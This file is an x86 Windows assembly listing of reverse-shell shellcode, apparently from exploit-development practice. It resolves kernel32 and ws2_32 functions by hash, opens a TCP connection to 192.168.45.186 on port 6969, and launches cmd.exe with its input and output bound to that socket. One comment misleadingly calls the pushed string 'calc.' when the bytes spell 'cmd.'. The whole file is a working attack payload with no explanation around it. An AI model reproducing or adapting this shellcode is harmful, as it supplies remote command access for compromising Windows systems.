    start:                                ;
       ;int3                              ; REMOVE WHEN NOT DEBUGGING
       mov ebp, esp                       ;
       add esp, 0xfffff9f0                ;

    find_kernel32:                        ;
       xor ecx,ecx                        ; # ECX = 0
       mov esi,fs:[ecx+30h]               ; # ESI = &(PEB) ([FS:0x30])
       mov esi,[esi+0Ch]                  ; # ESI = PEB->Ldr
       mov esi,[esi+1Ch]                  ; # ESI = PEB->Ldr.InitOrder

    next_module:                          ;
       mov ebx,[esi+8h]                   ; # EBX = InInitOrder[X].base_address
       mov edi,[esi+20h]                  ; # EDI = InInitOrder[X].module_name
       mov esi,[esi]                      ; # ESI = InInitOrder[X].flink
       cmp [edi+12*2], cx                 ; # (unicode) modulename[12] == 0x00?
       jne next_module                    ; # No; try next module

    find_function_shorten:
        jmp find_function_shorten_bnc  	  ; #  Short jump

    find_function_ret:
        pop esi                           ; # POP the return address from the stack
        mov [ebp+0x04], esi               ; # Save find_function address for later usage
        jmp resolve_symbols_kernel32      ; # 

    find_function_shorten_bnc:            ;
        call find_function_ret            ; # Relative CALL with negative offset

    find_function:
        pushad                            ; # Save all registers. Base address of kernel32 is in EBX
        mov eax, [ebx+0x3c]               ; # Offset to PE registers
        mov edi, [ebx+eax+0x78]           ; # Export Table Directory RVA
        add edi, ebx                      ; # Export Table Directory VMA
        mov ecx, [edi+0x18]               ; # NumberOfNames
        mov eax, [edi+0x20]               ; # AddressOfNames RVA
        add eax, ebx                      ; # AddressOfNames VMA
        mov [ebp-4], eax                  ; # Save AddressOfNames VMA for later

    find_function_loop:
        jecxz find_function_finished      ; # Jump to end of ECX == 0
        dec ecx                           ; # Decrement counter
        mov eax, [ebp-4]                  ; # Restore AddressOfNames VMA
        mov esi, [eax+ecx*4]              ; # Get RVA of symbol name
        add esi, ebx                      ; # Set ESI to VMA of current symbol

    compute_hash:
        xor eax, eax                    ; # NULL EAX
        cdq                             ; # NULL EDX
        cld                             ; # Clear direction flag

    compute_hash_again:
        lodsb                           ; # Load the next byte from ESI into AL
        test al, al                     ; # Check for NULL term
        jz compute_hash_finished        ; # If zero flag is set, hitted the NULL
        ror edx, 0x0d                   ; # Rotate EDX 13 bits to right
        add edx, eax                    ; # Add new byte to EDX
        jmp compute_hash_again          ; # Next iteration

    compute_hash_finished:

    find_function_compare:
        cmp edx, [esp+0x24]             ; Compare hash with requested hash
        jnz find_function_loop          ; If not existing, go back to loop
        mov edx, [edi+0x24]             ; AddressOfNameOrdinals RVA
        add edx, ebx                    ; AddressOfNameOrdinals VMA
        mov cx, [edx+2*ecx]             ; Extrapolate function's ordinal
        mov edx, [edi+0x1c]             ; AddressOfFunctions RVA
        add edx, ebx                    ; AddressOfFunctions VMA
        mov eax, [edx+4*ecx]            ; Get the function RVA
        add eax, ebx                    ; Get the function VMA
        mov [esp+0x1c], eax             ; Overwrite stack version of EAX from PUSHAD

    find_function_finished:             ;
        popad                           ; # Restore registers
        ret

    resolve_symbols_kernel32:
        push 0x78b5b983                 ; TerminateProcess hash
        call dword ptr[ebp+0x04]        ; Call find function
        mov [ebp+0x10], eax             ; Save TerminateProcess
        push 0xec0e4e8e                 ; LoadLibraryA hash
        call dword ptr[ebp+0x04]        ; Call find function
        mov [ebp+0x14], eax             ; Save LoadLibraryA
        push 0x16b3fe72                 ; CreateProcessA hash
        call dword ptr[ebp+0x04]        ; Call find function
        mov [ebp+0x18], eax             ; Save CreateProcessA

    load_ws_32:
        xor eax, eax                    ; NULL EAX
        mov ax, 0x6c6c                  ; Move end of string in AX ; ll
        push eax                        ; Push NULL terminator
        push 0x642e3233                 ; d.23
        push 0x5f327377                 ; _2sw
        push esp                        ; Push to have a PTR to string
        call dword ptr[ebp+0x14]        ; Call LoadLibraryA

    resolve_symbols_ws2_32:
        mov ebx, eax                    ; Move base address of previous call (EAX) to EBX
        push 0x3bfcedcb                 ; WSAStartup hash
        call dword ptr[ebp+0x04]        ; Call find function
        mov [ebp+0x1c], eax             ; Save WSAStartup
        push 0xadf509d9                 ; WSASocketA hash
        call dword ptr[ebp+0x04]        ; Call find function
        mov [ebp+0x20], eax             ; Save WSASocketA hash
        push 0xb32dba0c                 ; WSAConnect hash
        call dword ptr[ebp+0x04]        ; Call find function
        mov [ebp+0x24], eax             ; Save WSAConnect hash

    call_wsastartup:
        xor ebx, ebx                    ; NULL EBX
        mov bx, 0x190                   ;# Move 0x190 to CX, size to store structure of WSAData
        sub esp, ebx                    ;# Substract CX from EAX avoiding overwriting structure later
        push esp                        ;# Push lpWSAData
        add ebx, 0x72                   ; 0x190 + 0x72 = 0x0202 for WinSock 2.2
        ;xor ecx, ecx                    ; NULL ECX
        ;mov cx, 0x0202                  ; Version WinSock 2.2
        push ebx                        ;# Push wVersionRequired
        call dword ptr[ebp+0x1c]        ;# Call WSAStartup

    call_wsasocketa:
        xor eax, eax                    ; NULL EAX
        push eax                        ; dwFlags == NULL
        push eax                        ; g == NULL
        push eax                        ; lpProtocolInfo == NULL
        mov al, 0x6                     ; protocol; IPPROTO_TCP == 6
        push eax                        ; Push protocol
        sub al, 0x5                     ; type; SOCK_STREAM == 1
        push eax                        ; Push type
        inc eax                         ; af; IPv4 == 2
        push eax                        ; Push af
        call dword ptr[ebp+0x20]        ; Call WSASocketA

    call_wsaconnect:
        ; struct sockaddr_in
        mov esi, eax                    ; Move output of previous call WSASocketA to EAX
        xor eax, eax                    ; NULL EAX
        push eax                        ; sin_zero == NULL  ; 0x10 in size, 2x NULL
        push eax                        ; sin_zero == NULL
        push 0x07fca8c0                 ; sin_addr == 192.168.45.186
        mov ax,0x391b                   ; sin_port == 6969
        shl eax, 0x10                   ; Left shift EAX by 0x10 bytes; USHORT, 2 bytes long
        add ax, 0x02                    ; Add 0x02 (AF_INET) to AX
        push eax                        ; Push sin_port & sin_family
        push esp                        ; Push pointer to sock_addr family
        pop edi                         ; Store pointer to sockaddr_in in EDI
        ; int WSAAPI WSAConnect
        xor eax, eax                    ; NULL EAX
        push eax                        ; lpGQOS == NULL
        push eax                        ; lpSQOS == NULL
        push eax                        ; lpCalleeData == NULL
        push eax                        ; lpCallerData == NULL
        add al, 0x10                    ; Length of namelen 0x10
        push eax                        ; Push namelen
        push edi                        ; Push sockaddr *name
        push esi                        ; Push s SOCKET; WSASocketA output previously stored
        call dword ptr[ebp+0x24]        ; Call WSAConnect

    create_startupinfoa:
        push esi                        ; Push hStdError
        push esi                        ; Push hStdOutput
        push esi                        ; Push hStdInput
        xor eax, eax                    ; NULL EAX
        push eax                        ; Push lpReserved2
        push eax                        ; Push cbReserved2 & wShowWindow
        mov eax, 0xfffffefe             ; Add value to negate
        neg eax                         ; Negate to 0x100
        push eax                        ; Push dwFlags; 0x100
        xor eax, eax                    ; NULL EAX
        push eax                        ; Push dwFillAtrribute
        push eax                        ; Push dwYCountChars
        push eax                        ; Push dwXCountChars
        push eax                        ; Push dwYSize
        push eax                        ; Push dwXSize
        push eax                        ; Push dwY
        push eax                        ; Push dwX
        push eax                        ; Push lpTitle
        push eax                        ; Push lpDesktop
        push eax                        ; Push lpReserved
        mov al, 0x44                    ; Move 0x44 to AL
        push eax                        ; Push cb
        push esp                        ; Pointer to STARTUPINFOA
        pop edi                         ; Store pointer in EDI

    create_cmd_string:                   ;
        mov eax, 0xff9a879b             ; XORRED "exe"
        neg eax                         ; Negate
        push eax                        ; Push 'exe'
        push 0x2e646d63                 ; "calc."
        push esp                        ; Push pointer of string
        pop ebx                         ; Store pointer in EBX

    call_createprocessa:
        mov eax, esp                    ; Move ESP to ECX
        xor ecx, ecx                    ; NULL ECX
        add cx, 0x390                   ; Add 0x390 to CX
        sub eax, ecx                    ; Subtract CX from EAX to make space for structure
        ; CreateProcessA
        push eax                        ; Push lpProcessInformation
        push edi                        ; Push lpStartupInfo; STARTUPINFOA pointer in EDI
        xor eax, eax                    ; NULL EAX
        push eax                        ; Push lpCurrentDirectory; NULL
        push eax                        ; Push lpEnvironment; NULL
        push eax                        ; Push dwCreationFlags; NULL
        inc eax                         ; TRUE == 0x1
        push eax                        ; Push bInheritHandles == 0x1
        dec eax                         ; Decrement EAX to NULL
        push eax                        ; Push lpThreadAttributes; NULL
        push eax                        ; Push lpProcessAttributes; NULL
        push ebx                        ; Push lpCommandLine; Pointer of CMD string in EBX
        push eax                        ; Push lpApplicationName; NULL
        call dword ptr[ebp+0x18]        ; Call CreateProcessA

    exec_shellcode:
        xor ecx, ecx                    ; NULL ECX
        push ecx                        ; uExitCode
        push 0xffffffff                 ; hProcess
        call dword ptr [ebp+0x10]       ; Call TerminateProcess
